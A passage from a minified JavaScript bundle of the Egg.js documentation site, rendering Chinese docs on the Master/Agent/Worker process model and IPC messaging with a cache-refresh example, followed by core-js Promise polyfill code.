",r.a.createElement("code",null,"egg.startCluster")," \u542f\u52a8\u7684 Master \u8fdb\u7a0b\u5c31\u53ef\u4ee5\u4e86\uff0c\u4e0d\u518d\u9700\u8981\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/Unitech/pm2"},"pm2")," \u7b49\u8fdb\u7a0b\u5b88\u62a4\u6a21\u5757\u3002"),r.a.createElement(o["a"],{code:"$ egg-scripts start --daemon",lang:"bash"}),r.a.createElement("h4",{id:"agent"},r.a.createElement(l["AnchorLink"],{to:"#agent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Agent"),r.a.createElement("p",null,"\u5728\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5728\u5199\u4e1a\u52a1\u4ee3\u7801\u7684\u65f6\u5019\u5b8c\u5168\u4e0d\u7528\u8003\u8651 Agent \u8fdb\u7a0b\u7684\u5b58\u5728\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u9047\u5230\u4e00\u4e9b\u573a\u666f\uff0c\u53ea\u60f3\u8ba9\u4ee3\u7801\u8fd0\u884c\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e0a\u7684\u65f6\u5019\uff0cAgent \u8fdb\u7a0b\u5c31\u5230\u4e86\u53d1\u6325\u4f5c\u7528\u7684\u65f6\u5019\u4e86\u3002"),r.a.createElement("p",null,"\u7531\u4e8e Agent \u53ea\u6709\u4e00\u4e2a\uff0c\u800c\u4e14\u4f1a\u8d1f\u8d23\u8bb8\u591a\u7ef4\u6301\u8fde\u63a5\u7684\u810f\u6d3b\u7d2f\u6d3b\uff0c\u56e0\u6b64\u5b83\u4e0d\u80fd\u8f7b\u6613\u6302\u6389\u548c\u91cd\u542f\uff0c\u6240\u4ee5 Agent \u8fdb\u7a0b\u5728\u76d1\u542c\u5230\u672a\u6355\u83b7\u5f02\u5e38\u65f6\u4e0d\u4f1a\u9000\u51fa\uff0c\u4f46\u662f\u4f1a\u6253\u5370\u51fa\u9519\u8bef\u65e5\u5fd7\uff0c",r.a.createElement("strong",null,"\u6211\u4eec\u9700\u8981\u5bf9\u65e5\u5fd7\u4e2d\u7684\u672a\u6355\u83b7\u5f02\u5e38\u63d0\u9ad8\u8b66\u60d5"),"\u3002"),r.a.createElement("h4",{id:"worker"},r.a.createElement(l["AnchorLink"],{to:"#worker","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Worker"),r.a.createElement("p",null,"Worker \u8fdb\u7a0b\u8d1f\u8d23\u5904\u7406\u771f\u6b63\u7684\u7528\u6237\u8bf7\u6c42\u548c",r.a.createElement(l["Link"],{to:"../basics/schedule"},"\u5b9a\u65f6\u4efb\u52a1"),"\u7684\u5904\u7406\u3002\u800c Egg \u7684\u5b9a\u65f6\u4efb\u52a1\u4e5f\u63d0\u4f9b\u4e86\u53ea\u8ba9\u4e00\u4e2a Worker \u8fdb\u7a0b\u8fd0\u884c\u7684\u80fd\u529b\uff0c",r.a.createElement("strong",null,"\u6240\u4ee5\u80fd\u591f\u901a\u8fc7\u5b9a\u65f6\u4efb\u52a1\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u4e0d\u8981\u653e\u5230 Agent \u4e0a\u6267\u884c"),"\u3002"),r.a.createElement("p",null,"Worker \u8fd0\u884c\u7684\u662f\u4e1a\u52a1\u4ee3\u7801\uff0c\u76f8\u5bf9\u4f1a\u6bd4 Agent \u548c Master \u8fdb\u7a0b\u4e0a\u8fd0\u884c\u7684\u4ee3\u7801\u590d\u6742\u5ea6\u66f4\u9ad8\uff0c\u7a33\u5b9a\u6027\u4e5f\u4f4e\u4e00\u70b9\uff0c",r.a.createElement("strong",null,"\u5f53 Worker \u8fdb\u7a0b\u5f02\u5e38\u9000\u51fa\u65f6\uff0cMaster \u8fdb\u7a0b\u4f1a\u91cd\u542f\u4e00\u4e2a Worker \u8fdb\u7a0b\u3002")),r.a.createElement("h2",{id:"\u8fdb\u7a0b\u95f4\u901a\u8bafipc"},r.a.createElement(l["AnchorLink"],{to:"#\u8fdb\u7a0b\u95f4\u901a\u8bafipc","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8fdb\u7a0b\u95f4\u901a\u8baf\uff08IPC\uff09"),r.a.createElement("p",null,"\u867d\u7136\u6bcf\u4e2a Worker \u8fdb\u7a0b\u662f\u76f8\u5bf9\u72ec\u7acb\u7684\uff0c\u4f46\u662f\u5b83\u4eec\u4e4b\u95f4\u59cb\u7ec8\u8fd8\u662f\u9700\u8981\u901a\u8baf\u7684\uff0c\u53eb\u8fdb\u7a0b\u95f4\u901a\u8baf\uff08IPC\uff09\u3002\u4e0b\u9762\u662f Node.js \u5b98\u65b9\u63d0\u4f9b\u7684\u4e00\u6bb5\u793a\u4f8b\u4ee3\u7801"),r.a.createElement(o["a"],{code:"'use strict';\nconst cluster = require('cluster');\n\nif (cluster.isMaster) {\n  const worker = cluster.fork();\n  worker.send('hi there');\n  worker.on('message', (msg) => {\n    console.log(`msg: ${msg} from worker#${worker.id}`);\n  });\n} else if (cluster.isWorker) {\n  process.on('message', (msg) => {\n    process.send(msg);\n  });\n}",lang:"js"}),r.a.createElement("p",null,"\u7ec6\u5fc3\u7684\u4f60\u53ef\u80fd\u5df2\u7ecf\u53d1\u73b0 cluster \u7684 IPC \u901a\u9053\u53ea\u5b58\u5728\u4e8e Master \u548c Worker/Agent \u4e4b\u95f4\uff0cWorker \u4e0e Agent \u8fdb\u7a0b\u4e92\u76f8\u95f4\u662f\u6ca1\u6709\u7684\u3002\u90a3\u4e48 Worker \u4e4b\u95f4\u60f3\u901a\u8baf\u8be5\u600e\u4e48\u529e\u5462\uff1f\u662f\u7684\uff0c\u901a\u8fc7 Master \u6765\u8f6c\u53d1\u3002"),r.a.createElement(o["a"],{code:"\u5e7f\u64ad\u6d88\u606f\uff1a agent => all workers\n                  +--------+          +-------+\n                  | Master |<---------| Agent |\n                  +--------+          +-------+\n                 /    |     \\\n                /     |      \\\n               /      |       \\\n              /       |        \\\n             v        v         v\n  +----------+   +----------+   +----------+\n  | Worker 1 |   | Worker 2 |   | Worker 3 |\n  +----------+   +----------+   +----------+\n\n\u6307\u5b9a\u63a5\u6536\u65b9\uff1a one worker => another worker\n                  +--------+          +-------+\n                  | Master |----------| Agent |\n                  +--------+          +-------+\n                 ^    |\n     send to    /     |\n    worker 2   /      |\n              /       |\n             /        v\n  +----------+   +----------+   +----------+\n  | Worker 1 |   | Worker 2 |   | Worker 3 |\n  +----------+   +----------+   +----------+",lang:"bash"}),r.a.createElement("p",null,"\u4e3a\u4e86\u65b9\u4fbf\u8c03\u7528\uff0c\u6211\u4eec\u5c01\u88c5\u4e86\u4e00\u4e2a messenger \u5bf9\u8c61\u6302\u5728 app / agent \u5b9e\u4f8b\u4e0a\uff0c\u63d0\u4f9b\u4e00\u7cfb\u5217\u53cb\u597d\u7684 API\u3002"),r.a.createElement("h3",{id:"\u53d1\u9001"},r.a.createElement(l["AnchorLink"],{to:"#\u53d1\u9001","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53d1\u9001"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.messenger.broadcast(action, data)"),"\uff1a\u53d1\u9001\u7ed9\u6240\u6709\u7684 agent / app \u8fdb\u7a0b\uff08\u5305\u62ec\u81ea\u5df1\uff09"),r.a.createElement("li",null,r.a.createElement("code",null,"app.messenger.sendToApp(action, data)"),": \u53d1\u9001\u7ed9\u6240\u6709\u7684 app \u8fdb\u7a0b",r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 app \u4e0a\u8c03\u7528\u8be5\u65b9\u6cd5\u4f1a\u53d1\u9001\u7ed9\u81ea\u5df1\u548c\u5176\u4ed6\u7684 app \u8fdb\u7a0b"),r.a.createElement("li",null,"\u5728 agent \u4e0a\u8c03\u7528\u8be5\u65b9\u6cd5\u4f1a\u53d1\u9001\u7ed9\u6240\u6709\u7684 app \u8fdb\u7a0b"))),r.a.createElement("li",null,r.a.createElement("code",null,"app.messenger.sendToAgent(action, data)"),": \u53d1\u9001\u7ed9 agent \u8fdb\u7a0b",r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 app \u4e0a\u8c03\u7528\u8be5\u65b9\u6cd5\u4f1a\u53d1\u9001\u7ed9 agent \u8fdb\u7a0b"),r.a.createElement("li",null,"\u5728 agent \u4e0a\u8c03\u7528\u8be5\u65b9\u6cd5\u4f1a\u53d1\u9001\u7ed9 agent \u81ea\u5df1"))),r.a.createElement("li",null,r.a.createElement("code",null,"agent.messenger.sendRandom(action, data)"),":",r.a.createElement("ul",null,r.a.createElement("li",null,"app \u4e0a\u6ca1\u6709\u8be5\u65b9\u6cd5\uff08\u73b0\u5728 Egg \u7684\u5b9e\u73b0\u662f\u7b49\u540c\u4e8e sentToAgent\uff09"),r.a.createElement("li",null,"agent \u4f1a\u968f\u673a\u53d1\u9001\u6d88\u606f\u7ed9\u4e00\u4e2a app \u8fdb\u7a0b\uff08\u7531 master \u6765\u63a7\u5236\u53d1\u9001\u7ed9\u8c01\uff09"))),r.a.createElement("li",null,r.a.createElement("code",null,"app.messenger.sendTo(pid, action, data)"),": \u53d1\u9001\u7ed9\u6307\u5b9a\u8fdb\u7a0b")),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  // \u6ce8\u610f\uff0c\u53ea\u6709\u5728 egg-ready \u4e8b\u4ef6\u62ff\u5230\u4e4b\u540e\u624d\u80fd\u53d1\u9001\u6d88\u606f\n  app.messenger.once('egg-ready', () => {\n    app.messenger.sendToAgent('agent-event', { foo: 'bar' });\n    app.messenger.sendToApp('app-event', { foo: 'bar' });\n  });\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("em",null,"\u4e0a\u9762\u6240\u6709 ",r.a.createElement("code",null,"app.messenger")," \u4e0a\u7684\u65b9\u6cd5\u90fd\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"agent.messenger")," \u4e0a\u4f7f\u7528\u3002")),r.a.createElement("h4",{id:"egg-ready"},r.a.createElement(l["AnchorLink"],{to:"#egg-ready","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"egg-ready"),r.a.createElement("p",null,"\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\u63d0\u5230\uff0c\u9700\u8981\u7b49 ",r.a.createElement("code",null,"egg-ready")," \u6d88\u606f\u4e4b\u540e\u624d\u80fd\u53d1\u9001\u6d88\u606f\u3002\u53ea\u6709\u5728 Master \u786e\u8ba4\u6240\u6709\u7684 Agent \u8fdb\u7a0b\u548c Worker \u8fdb\u7a0b\u90fd\u5df2\u7ecf\u6210\u529f\u542f\u52a8\uff08\u5e76 ready\uff09\u4e4b\u540e\uff0c\u624d\u4f1a\u901a\u8fc7 messenger \u53d1\u9001 ",r.a.createElement("code",null,"egg-ready")," \u6d88\u606f\u7ed9\u6240\u6709\u7684 Agent \u548c Worker\uff0c\u544a\u77e5\u4e00\u5207\u51c6\u5907\u5c31\u7eea\uff0cIPC \u901a\u9053\u53ef\u4ee5\u5f00\u59cb\u4f7f\u7528\u4e86\u3002"),r.a.createElement("h3",{id:"\u63a5\u6536"},r.a.createElement(l["AnchorLink"],{to:"#\u63a5\u6536","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63a5\u6536"),r.a.createElement("p",null,"\u5728 messenger \u4e0a\u76d1\u542c\u5bf9\u5e94\u7684 action \u4e8b\u4ef6\uff0c\u5c31\u53ef\u4ee5\u6536\u5230\u5176\u4ed6\u8fdb\u7a0b\u53d1\u9001\u6765\u7684\u4fe1\u606f\u4e86\u3002"),r.a.createElement(o["a"],{code:"app.messenger.on(action, (data) => {\n  // process data\n});\napp.messenger.once(action, (data) => {\n  // process data\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("em",null,"agent \u4e0a\u7684 messenger \u63a5\u6536\u6d88\u606f\u7684\u7528\u6cd5\u548c app \u4e0a\u4e00\u81f4\u3002")),r.a.createElement("h2",{id:"ipc-\u5b9e\u6218"},r.a.createElement(l["AnchorLink"],{to:"#ipc-\u5b9e\u6218","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"IPC \u5b9e\u6218"),r.a.createElement("p",null,"\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u611f\u53d7\u4e00\u4e0b\u5728\u6846\u67b6\u7684\u591a\u8fdb\u7a0b\u6a21\u578b\u4e0b\u5982\u4f55\u4f7f\u7528 IPC \u89e3\u51b3\u5b9e\u9645\u95ee\u9898\u3002"),r.a.createElement("h3",{id:"\u9700\u6c42"},r.a.createElement(l["AnchorLink"],{to:"#\u9700\u6c42","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9700\u6c42"),r.a.createElement("p",null,"\u6211\u4eec\u6709\u4e00\u4e2a\u63a5\u53e3\u9700\u8981\u4ece\u8fdc\u7a0b\u6570\u636e\u6e90\u4e2d\u8bfb\u53d6\u4e00\u4e9b\u6570\u636e\uff0c\u5bf9\u5916\u90e8\u63d0\u4f9b API\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u636e\u6e90\u7684\u6570\u636e\u5f88\u5c11\u53d8\u5316\uff0c\u56e0\u6b64\u6211\u4eec\u5e0c\u671b\u5c06\u6570\u636e\u7f13\u5b58\u5230\u5185\u5b58\u4e2d\u4ee5\u63d0\u5347\u670d\u52a1\u80fd\u529b\uff0c\u964d\u4f4e RT\u3002\u6b64\u65f6\u5c31\u9700\u8981\u6709\u4e00\u4e2a\u66f4\u65b0\u5185\u5b58\u7f13\u5b58\u7684\u673a\u5236\u3002"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u5b9a\u65f6\u4ece\u8fdc\u7a0b\u6570\u636e\u6e90\u83b7\u53d6\u6570\u636e\uff0c\u66f4\u65b0\u5185\u5b58\u7f13\u5b58\uff0c\u4e3a\u4e86\u964d\u4f4e\u5bf9\u6570\u636e\u6e90\u538b\u529b\uff0c\u66f4\u65b0\u7684\u95f4\u9694\u65f6\u95f4\u4f1a\u8bbe\u7f6e\u7684\u6bd4\u8f83\u957f\u3002"),r.a.createElement("li",null,"\u8fdc\u7a0b\u6570\u636e\u6e90\u63d0\u4f9b\u4e00\u4e2a\u68c0\u67e5\u662f\u5426\u6709\u6570\u636e\u66f4\u65b0\u7684\u63a5\u53e3\uff0c\u6211\u4eec\u7684\u670d\u52a1\u53ef\u4ee5\u66f4\u9891\u7e41\u7684\u8c03\u7528\u68c0\u67e5\u63a5\u53e3\uff0c\u5f53\u6709\u6570\u636e\u66f4\u65b0\u65f6\u624d\u53bb\u91cd\u65b0\u62c9\u53d6\u6570\u636e\u3002"),r.a.createElement("li",null,"\u8fdc\u7a0b\u6570\u636e\u6e90\u901a\u8fc7\u6d88\u606f\u4e2d\u95f4\u4ef6\u63a8\u9001\u6570\u636e\u66f4\u65b0\u7684\u6d88\u606f\uff0c\u6211\u4eec\u7684\u670d\u52a1\u76d1\u542c\u6d88\u606f\u6765\u66f4\u65b0\u6570\u636e\u3002")),r.a.createElement("p",null,"\u5728\u5b9e\u9645\u9879\u76ee\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u65b9\u6848\u4e00\u7528\u4e8e\u515c\u5e95\uff0c\u7ed3\u5408\u65b9\u6848\u4e09\u6216\u8005\u65b9\u6848\u4e8c\u7684\u4e00\u79cd\u7528\u4e8e\u63d0\u5347\u6570\u636e\u66f4\u65b0\u7684\u5b9e\u65f6\u6027\u3002\u800c\u5728\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f1a\u901a\u8fc7 IPC + ",r.a.createElement(l["Link"],{to:"../basics/schedule"},"\u5b9a\u65f6\u4efb\u52a1"),"\u6765\u540c\u65f6\u5b9e\u73b0\u8fd9\u4e09\u79cd\u7f13\u5b58\u66f4\u65b0\u65b9\u6848\u3002"),r.a.createElement("h3",{id:"\u5b9e\u73b0"},r.a.createElement(l["AnchorLink"],{to:"#\u5b9e\u73b0","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b9e\u73b0"),r.a.createElement("p",null,"\u6211\u4eec\u5c06\u6240\u6709\u7684\u4e0e\u8fdc\u7a0b\u6570\u636e\u6e90\u4ea4\u4e92\u7684\u903b\u8f91\u5c01\u88c5\u5728\u4e00\u4e2a Service \u4e2d\uff0c\u5e76\u63d0\u4f9b ",r.a.createElement("code",null,"get")," \u65b9\u6cd5\u7ed9 Controller \u8c03\u7528\u3002"),r.a.createElement(o["a"],{code:"// app/service/source.js\nlet memoryCache = {};\n\nclass SourceService extends Service {\n  get(key) {\n    return memoryCache[key];\n  }\n\n  async checkUpdate() {\n    // check if remote data source has changed\n    const updated = await mockCheck();\n    this.ctx.logger.info('check update response %s', updated);\n    return updated;\n  }\n\n  async update() {\n    // update memory cache from remote\n    memoryCache = await mockFetch();\n    this.ctx.logger.info('update memory cache from remote: %j', memoryCache);\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u7f16\u5199\u5b9a\u65f6\u4efb\u52a1\uff0c\u5b9e\u73b0\u65b9\u6848\u4e00\uff0c\u6bcf 10 \u5206\u949f\u5b9a\u65f6\u4ece\u8fdc\u7a0b\u6570\u636e\u6e90\u83b7\u53d6\u6570\u636e\u66f4\u65b0\u7f13\u5b58\u505a\u515c\u5e95\u3002"),r.a.createElement(o["a"],{code:"// app/schedule/force_refresh.js\nexports.schedule = {\n  interval: '10m',\n  type: 'all', // run in all workers\n};\n\nexports.task = async (ctx) => {\n  await ctx.service.source.update();\n  ctx.app.lastUpdateBy = 'force';\n};",lang:"js"}),r.a.createElement("p",null,"\u518d\u7f16\u5199\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u6765\u5b9e\u73b0\u65b9\u6848\u4e8c\u7684\u68c0\u67e5\u903b\u8f91\uff0c\u6bcf 10s \u8ba9\u4e00\u4e2a worker \u8c03\u7528\u68c0\u67e5\u63a5\u53e3\uff0c\u5f53\u53d1\u73b0\u6570\u636e\u6709\u53d8\u5316\u65f6\uff0c\u901a\u8fc7 messenger \u63d0\u4f9b\u7684\u65b9\u6cd5\u901a\u77e5\u6240\u6709\u7684 Worker\u3002"),r.a.createElement(o["a"],{code:"// app/schedule/pull_refresh.js\nexports.schedule = {\n  interval: '10s',\n  type: 'worker', // only run in one worker\n};\n\nexports.task = async (ctx) => {\n  const needRefresh = await ctx.service.source.checkUpdate();\n  if (!needRefresh) return;\n\n  // notify all workers to update memory cache from `file`\n  ctx.app.messenger.sendToApp('refresh', 'pull');\n};",lang:"js"}),r.a.createElement("p",null,"\u5728\u542f\u52a8\u81ea\u5b9a\u4e49\u6587\u4ef6\u4e2d\u76d1\u542c ",r.a.createElement("code",null,"refresh")," \u4e8b\u4ef6\uff0c\u5e76\u66f4\u65b0\u6570\u636e\uff0c\u6240\u6709\u7684 Worker \u8fdb\u7a0b\u90fd\u80fd\u6536\u5230\u8fd9\u4e2a\u6d88\u606f\uff0c\u5e76\u89e6\u53d1\u66f4\u65b0\uff0c\u6b64\u65f6\u6211\u4eec\u7684\u65b9\u6848\u4e8c\u4e5f\u5df2\u7ecf\u5927\u529f\u544a\u6210\u4e86\u3002"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.messenger.on('refresh', (by) => {\n    app.logger.info('start update by %s', by);\n    // create an anonymous context to access service\n    const ctx = app.createAnonymousContext();\n    ctx.runInBackground(async () => {\n      await ctx.service.source.update();\n      app.lastUpdateBy = by;\n    });\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u73b0\u5728\u6211\u4eec\u6765\u770b\u770b\u5982\u4f55\u5b9e\u73b0\u7b2c\u4e09\u4e2a\u65b9\u6848\u3002\u6211\u4eec\u9700\u8981\u6709\u4e00\u4e2a\u6d88\u606f\u4e2d\u95f4\u4ef6\u7684\u5ba2\u6237\u7aef\uff0c\u5b83\u4f1a\u548c\u670d\u52a1\u7aef\u4fdd\u6301\u957f\u8fde\u63a5\uff0c\u8fd9\u4e00\u7c7b\u7684\u957f\u8fde\u63a5\u7ef4\u6301\u6bd4\u8f83\u9002\u5408\u5728 Agent \u8fdb\u7a0b\u4e0a\u505a\uff0c\u53ef\u4ee5\u6709\u6548\u964d\u4f4e\u8fde\u63a5\u6570\uff0c\u51cf\u5c11\u4e24\u7aef\u7684\u6d88\u8017\u3002\u6240\u4ee5\u6211\u4eec\u5728 Agent \u8fdb\u7a0b\u4e0a\u6765\u5f00\u542f\u6d88\u606f\u76d1\u542c\u3002"),r.a.createElement(o["a"],{code:"// agent.js\n\nconst Subscriber = require('./lib/subscriber');\n\nmodule.exports = (agent) => {\n  const subscriber = new Subscriber();\n  // listen changed event, broadcast to all workers\n  subscriber.on('changed', () => agent.messenger.sendToApp('refresh', 'push'));\n};",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7\u5408\u7406\u4f7f\u7528 Agent \u8fdb\u7a0b\u3001\u5b9a\u65f6\u4efb\u52a1\u548c IPC\uff0c\u6211\u4eec\u53ef\u4ee5\u8f7b\u677e\u641e\u5b9a\u7c7b\u4f3c\u7684\u9700\u6c42\u5e76\u964d\u4f4e\u5bf9\u6570\u636e\u6e90\u7684\u538b\u529b\u3002\u5177\u4f53\u7684\u793a\u4f8b\u4ee3\u7801\u53ef\u4ee5\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/ipc"},"examples/ipc"),"\u3002"),r.a.createElement("h2",{id:"\u66f4\u590d\u6742\u7684\u573a\u666f"},r.a.createElement(l["AnchorLink"],{to:"#\u66f4\u590d\u6742\u7684\u573a\u666f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u66f4\u590d\u6742\u7684\u573a\u666f"),r.a.createElement("p",null,"\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5728 Agent \u8fdb\u7a0b\u4e0a\u8fd0\u884c\u4e86\u4e00\u4e2a subscriber\uff0c\u6765\u76d1\u542c\u6d88\u606f\u4e2d\u95f4\u4ef6\u7684\u6d88\u606f\uff0c\u5982\u679c Worker \u8fdb\u7a0b\u4e5f\u9700\u8981\u76d1\u542c\u4e00\u4e9b\u6d88\u606f\u600e\u4e48\u529e\uff1f\u5982\u4f55\u901a\u8fc7 Agent \u8fdb\u7a0b\u5efa\u7acb\u8fde\u63a5\u518d\u8f6c\u53d1\u7ed9 Worker \u8fdb\u7a0b\u5462\uff1f\u8fd9\u4e9b\u95ee\u9898\u53ef\u4ee5\u5728",r.a.createElement(l["Link"],{to:"../advanced/cluster-client"},"\u591a\u8fdb\u7a0b\u7814\u53d1\u6a21\u5f0f\u589e\u5f3a"),"\u4e2d\u627e\u5230\u7b54\u6848\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},"9XUD":function(e,t,n){"use strict";var a,r,l,o,i=n("0mt+"),c=n("m4/z"),s=n("A0UU"),u=n("V3tB"),d=n("npLq"),m=n("AzF/"),p=n("P0Lz"),h=n("oi/H"),g=n("tPcN"),f=n("a7jj"),E=n("XaNN"),b=n("k8mt"),v=n("AaXQ"),y=n("fJSU"),k=n("NBU9"),w=n("o9Ln"),x=n("j9ts"),j=n("HvYB").set,S=n("JfFA"),C=n("qkIw"),A=n("fhnH"),L=n("PAgB"),T=n("jdHz"),N=n("lz/I"),O=n("ALk6"),I=n("q7Pv"),P=n("/bXB"),R=I("species"),_="Promise",q=N.get,M=N.set,F=N.getterFor(_),D=d,U=s.TypeError,z=s.document,H=s.process,B=u("fetch"),W=L.f,V=W,$="process"==v(H),G=!!(z&&z.createEvent&&s.dispatchEvent),X="unhandledrejection",Q="rejectionhandled",K=0,J=1,Y=2,Z=1,ee=2,te=O(_,(function(){var e=y(D)!==String(D);if(!e){if(66===P)return!0;if(!$&&"function"!=typeof PromiseRejectionEvent)return!0}if(c&&!D.prototype["finally"])return!0;if(P>=51&&/native code/.test(D))return!1;var t=D.resolve(1),n=function(e){e((function(){}),(function(){}))},a=t.constructor={};return a[R]=n,!(t.then((function(){}))instanceof n)})),ne=te||!w((function(e){D.all(e)["catch"]((function(){}))})),ae=function(e){var t;return!(!f(e)||"function"!=typeof(t=e.then))&&t},re=function(e,t,n){if(!t.notified){t.notified=!0;var a=t.reactions;S((function(){var r=t.value,l=t.state==J,o=0;while(a.length>o){var i,c,s,u=a[o++],d=l?u.ok:u.fail,m=u.resolve,p=u.reject,h=u.domain;try{d?(l||(t.rejection===ee&&ce(e,t),t.rejection=Z),!0===d?i=r:(h&&h.enter(),i=d(r),h&&(h.exit(),s=!0)),i===u.promise?p(U("Promise-chain cycle")):(c=ae(i))?c.call(i,m,p):m(i)):p(r)}catch(g){h&&!s&&h.exit(),p(g)}}t.reactions=[],t.notified=!1,n&&!t.rejection&&oe(e,t)}))}},le=function(e,t,n){var a,r;G?(a=z.createEvent("Event"),a.promise=t,a.reason=n,a.initEvent(e,!1,!0),s.dispatchEvent(a)):a={promise:t,reason:n},(r=s["on"+e])?r(a):e===X&&A("Unhandled promise rejection",n)},oe=function(e,t){j.call(s,(function(){var n,a=t.value,r=ie(t);if(r&&(n=T((function(){$?H.emit("unhandledRejection",a,e):le(X,e,a)})),t.rejection=$||ie(t)?ee:Z,n.error))throw n.value}))},ie=function(e){return e.rejection!==Z&&!e.parent},ce=function(e,t){j.call(s,(function(){$?H.emit("rejectionHandled",e):le(Q,e,t.value)}))},se=function(e,t,n,a){return function(r){e(t,n,r,a)}},ue=function(e,t,n,a){t.done||(t.done=!0,a&&(t=a),t.value=n,t.state=Y,re(e,t,!0))},de=function(e,t,n,a){if(!t.done){t.done=!0,a&&(t=a);try{if(e===n)throw U("Promise can't be resolved itself");var r=ae(n);r?S((function(){var a={done:!1};try{r.call(n,se(de,e,a,t),se(ue,e,a,t))}catch(l){ue(e,a,l,t)}})):(t.value=n,t.state=J,re(e,t,!1))}catch(l){ue(e,{done:!1},l,t)}}};te&&(D=function(e){b(this,D,_),E(e),a.call(this);var t=q(this);try{e(se(de,this,t),se(ue,this,t))}catch(n){ue(this,t,n)}},a=function(e){M(this,{type:_,done:!1,notified:!1,parent:!1,reactions:[],rejection:!1,state:K,value:void 0})},a.prototype=p(D.prototype,{then:function(e,t){var n=F(this),a=W(x(this,D));return a.ok="function"!=typeof e||e,a.fail="function"==typeof t&&t,a.domain=$?H.domain:void 0,n.parent=!0,n.reactions.push(a),n.state!=K&&re(this,n,!1),a.promise},catch:function(e){return this.then(void 0,e)}}),r=function(){var e=new a,t=q(e);this.promise=e,this.resolve=se(de,e,t),this.reject=se(ue,e,t)},L.f=W=function(e){return e===D||e===l?new r(e):V(e)},c||"function"!=typeof d||(o=d.prototype.then,m(d.prototype,"then",(function(e,t){var n=this;return new D((function(e,t){o.call(n,e,t)})).then(e,t)}),{unsafe:!0}),"function"==typeof B&&i({global:!0,enumerable:!0,forced:!0},{fetch:function(e){return C(D,B.apply(s,arguments))}}))),i({global:!0,wrap:!0,forced:te},{Promise:D}),h(D,_,!1,!0),g(_),l=u(_),i({target:_,stat:!0,forced:te},{reject:function(e){var t=W(this);return t.reject.call(void 0,e),t.promise}}),i({target:_,stat:!0,forced:c||te},{resolve:function(e){return C(c&&this===l?D:this,e)}}),i({target:_,stat:!0,forced:ne},{all:function(e){var t=this,n=W(t),a=n.resolve,r=n.reject,l=T((function(){var n=E(t.resolve),l=[],o=0,i=1;k(e,(function(e){var c=o++,s=!1;l.push(void 0),i++,n.call(t,e).then((function(e){s||(s=!0,l[c]=e,--i||a(l))}),r)})),--i||a(l)}));return l.error&&r(l.value),n.promise},race:function(e){var t=this,n=W(t),a=n.reject,r=T((function(){var r=E(t.resolve);k(e,(function(e){r.call(t,e).then(n.resolve,a)}))}));return r.error&&a(r.value),n.promise}})},"9djW":function(e,t,n){var a=n("u9el");a("Uint8",(function(e){return function(t,n,a){return e(this,t,n,a)}}))},"9u3R":function(e,t,n){var a=n("iiq2"),r="object"==typeof self&&self&&self.Object===Object&&self,l=a||r||Function("return this")();e.exports=l},"9xi1":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u63d2\u4ef6\u673a\u5236\u662f\u6211\u4eec\u6846\u67b6\u7684\u4e00\u5927\u7279\u8272\u3002\u5b83\u4e0d\u4f46\u53ef\u4ee5\u4fdd\u8bc1\u6846\u67b6\u6838\u5fc3\u7684\u8db3\u591f\u7cbe\u7b80\u3001\u7a33\u5b9a\u3001\u9ad8\u6548\uff0c\u8fd8\u53ef\u4ee5\u4fc3\u8fdb\u4e1a\u52a1\u903b\u8f91\u7684\u590d\u7528\uff0c\u751f\u6001\u5708\u7684\u5f62\u6210\u3002\u6709\u4eba\u53ef\u80fd\u4f1a\u95ee\u4e86\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"Koa 